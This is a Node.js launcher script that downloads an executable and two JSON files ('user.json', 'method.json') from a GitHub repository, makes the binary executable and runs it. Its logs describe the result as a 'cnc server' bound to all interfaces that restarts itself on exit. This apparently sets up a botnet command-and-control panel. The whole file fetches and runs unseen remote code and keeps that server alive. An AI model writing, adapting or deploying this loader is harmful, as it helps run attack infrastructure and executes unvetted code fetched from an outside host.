const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const OWNER = 'malasahjagotwin';
const REPO = 'cgo';
const BASES = [
  `https://raw.githubusercontent.com/${OWNER}/${REPO}/main`,
  `https://github.com/${OWNER}/${REPO}/raw/refs/heads/main`,
];

function request(url, redirects) {
  return new Promise((resolve, reject) => {
    const mod = url.startsWith('https:') ? https : http;
    const req = mod.get(url, { headers: { 'User-Agent': 'node' } }, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location && redirects < 5) {
        res.resume();
        resolve(request(new URL(res.headers.location, url).toString(), redirects + 1));
        return;
      }
      if (res.statusCode !== 200) {
        res.resume();
        resolve({ status: res.statusCode, buffer: null });
        return;
      }
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: 200, buffer: Buffer.concat(chunks) }));
    });
    req.on('error', reject);
    req.setTimeout(20000, () => req.destroy(new Error('timeout')));
  });
}

async function download(rel, dest) {
  for (const base of BASES) {
    try {
      const { status, buffer } = await request(`${base}/${rel}`, 0);
      if (status === 200 && buffer && buffer.length > 0) {
        await fs.promises.mkdir(path.dirname(dest), { recursive: true });
        await fs.promises.writeFile(dest, buffer);
        await fs.promises.chmod(dest, 0o755);
        return true;
      }
    } catch {}
  }
  return false;
}

function detectPort() {
  if (process.env.SERVER_PORT && /^\d+$/.test(process.env.SERVER_PORT)) {
    return process.env.SERVER_PORT;
  }
  const i = process.argv.indexOf('--port');
  if (i !== -1 && process.argv[i + 1] && /^\d+$/.test(process.argv[i + 1])) {
    return process.argv[i + 1];
  }
  if (process.env.PORT && /^\d+$/.test(process.env.PORT)) {
    return process.env.PORT;
  }
  return '8080';
}

const FILES = [
  ['bin/main', 'main'],
  ['user.json', 'user.json'],
  ['method.json', 'method.json'],
];

async function fetchAll() {
  for (const [rel, local] of FILES) {
    let ok = false;
    for (let attempt = 0; attempt < 3 && !ok; attempt++) {
      ok = await download(rel, path.join(__dirname, local));
      if (!ok) {
        await new Promise((r) => setTimeout(r, 2000 * (attempt + 1)));
      }
    }
    console.log(`${ok ? 'downloaded' : 'failed to download'} ${local}`);
    if (!ok) {
      return false;
    }
  }
  return true;
}

async function main() {
  console.log('cnc setup: fetching binaries from GitHub');
  if (!(await fetchAll())) {
    console.error('setup failed, exiting');
    process.exit(1);
  }
  const port = detectPort();
  console.log(`starting cnc server on 0.0.0.0:${port}`);
  const server = spawn(path.join(__dirname, 'main'), ['-p', port, '-host', '0.0.0.0'], {
    stdio: 'inherit',
    cwd: __dirname,
  });
  server.on('exit', (code) => {
    console.log(`server exited with code ${code}, restarting`);
    setTimeout(main, 2000);
  });
}

main();